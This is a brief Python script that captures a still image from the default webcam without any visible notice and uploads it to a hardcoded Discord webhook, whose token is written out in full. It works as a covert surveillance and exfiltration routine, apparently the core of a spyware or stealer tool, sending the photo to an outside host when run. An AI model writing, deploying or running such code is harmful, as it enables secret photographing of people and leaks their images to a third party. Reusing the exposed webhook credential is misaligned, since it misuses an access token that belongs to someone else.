import cv2
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed

def capture_and_send_image(webhook_url):
    webcam = cv2.VideoCapture(0)
    sleep(2)

    check, frame = webcam.read()
    cv2.imwrite('captured_image.jpg', frame)

    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title='Captured Image', description='Image from webcam', color=0x3498db)

    with open('captured_image.jpg', 'rb') as f:
        embed.set_image(url='attachment://captured_image.jpg')
        webhook.add_file(file=f.read(), filename='captured_image.jpg')

    webhook.add_embed(embed)
    webhook.execute()
    key = cv2.waitKey(1)

webhook_url = 'https://discord.com/api/webhooks/1181579952865419314/7uGEy040yuo8jukOzt5CJXlNo6k8a9VrmgeNaLGPp9RaiqHgQcsr0y7ouSDwmWFIH8Ez'

# Appel de la fonction pour capturer et envoyer l'image
capture_and_send_image(webhook_url)
